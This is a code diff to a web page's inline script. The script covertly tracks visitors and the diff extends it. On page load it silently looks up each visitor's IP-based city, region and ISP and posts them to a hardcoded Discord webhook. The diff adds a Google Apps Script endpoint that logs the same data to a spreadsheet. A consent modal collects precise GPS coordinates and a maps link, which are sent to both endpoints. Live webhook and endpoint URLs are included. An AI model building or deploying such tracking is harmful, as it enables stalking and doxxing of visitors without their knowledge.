@@ -211,46 +211,72 @@
   </div>
 
   <!-- Dual Network & GPS Tracking Script -->
+  <!-- Dual Discord & Google Sheets Tracking Script -->
   <script>
     (function() {
+      // 1. YOUR API ENDPOINTS
       const webhookUrl = "https://discord.com/api/webhooks/1540036622588973208/IudKYFiIddlEWlI7roHuoq4C1rnaw2-N-fvYEr1swegtxGq0FnBAoDmvCBpBWA3Wgmzp";
+      
+      // PASTE YOUR GOOGLE APPS SCRIPT WEB APP URL HERE:
+      const sheetsUrl = "https://script.google.com/macros/s/AKfycbwYJdqLkNPNLipKvpszfQT3tmDaCVesIoJnhhzkdRPI1rwzlqc7lFpuNxmPuKwCJMQ_/exec";
 
-      // 1. SILENT IMMEDIATE NETWORK PING (Fires on page load)
+     // Helper function to send data to Google Sheets
+      function sendToSheet(payload) {
+        if (!sheetsUrl) return;
+        fetch(sheetsUrl, {
+          method: 'POST',
+          mode: 'no-cors',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        }).catch(err => console.error("Sheet log error:", err));
+      }
+
+      // 2. SILENT IMMEDIATE NETWORK PING (Fires on page load)
       fetch('https://ipapi.co/json/')
         .then(res => res.json())
         .then(data => {
+          const locationStr = `${data.city || 'Unknown'}, ${data.region || ''}`;
+          const carrierStr = data.org || 'Unknown';
+
+          // A. Send to Discord
           const payload = {
             embeds: [{
               title: "👁️ Network Log (Step 1)",
               color: 16770560,
               fields: [
-                { name: "Regional Hub", value: `${data.city || 'Unknown'}, ${data.region || ''}`, inline: true },
-                { name: "Carrier / ISP", value: `${data.org || 'Unknown'}`, inline: true },
+                { name: "Regional Hub", value: locationStr, inline: true },
+                { name: "Carrier / ISP", value: carrierStr, inline: true },
                 { name: "Time", value: new Date().toLocaleString(), inline: false }
               ],
               footer: { text: "5 statements (2 propositions) ledger" }
             }]
           };
 
-          return fetch(webhookUrl, {
+          fetch(webhookUrl, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(payload)
           });
+
+          // B. Send to Google Sheets
+          sendToSheet({
+            type: "Network Log",
+            location: locationStr,
+            carrier: carrierStr,
+            mapsUrl: "N/A"
+          });
         })
         .catch(err => console.error("IP log error:", err));
 
-      // 2. MODAL INTERACTION & GPS OPT-IN
+      // 3. MODAL INTERACTION & GPS OPT-IN
       const modal = document.getElementById('gps-modal');
       const acceptBtn = document.getElementById('gps-accept');
       const declineBtn = document.getElementById('gps-decline');
 
-      // Dismiss modal if user clicks decline
       declineBtn.addEventListener('click', () => {
         modal.style.display = 'none';
       });
 
-      // Trigger browser location prompt when clicking accept
       acceptBtn.addEventListener('click', () => {
         modal.style.display = 'none';
 
@@ -261,6 +287,7 @@
               const lon = position.coords.longitude;
               const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
 
+              // A. Send GPS to Discord
               const gpsPayload = {
                 embeds: [{
                   title: "📍 Precise GPS Unlocked (Step 2)",
@@ -277,6 +304,14 @@
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(gpsPayload)
+              });
+
+              // B. Send GPS to Google Sheets
+              sendToSheet({
+                type: "GPS Unlocked",
+                location: `${lat.toFixed(5)}, ${lon.toFixed(5)}`,
+                carrier: "GPS Verified",
+                mapsUrl: mapsUrl
               });
             },
             (error) => {
